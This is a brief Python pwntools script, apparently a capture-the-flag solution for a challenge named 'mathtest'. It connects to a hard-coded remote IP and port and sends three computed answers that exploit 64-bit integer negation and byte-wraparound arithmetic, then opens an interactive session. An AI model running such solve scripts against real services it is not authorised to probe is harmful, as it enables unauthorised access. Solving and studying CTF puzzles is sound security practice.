from pwn import *

# io = process("./mathtest")
io = remote("18.207.140.246", "9001")

for i in range(0xff+1):
    if chr((i * ord('O')) & 0xff) == 'A':
        ans3 = chr(i)

ans1 = negate(36864, 64)
ans2 = -(negate(3735928559, 64))

sleep(60)

io.sendline('n')
io.sendline(str(ans1))
io.sendline(str(ans2))
io.sendline(str(ans3))

io.interactive()
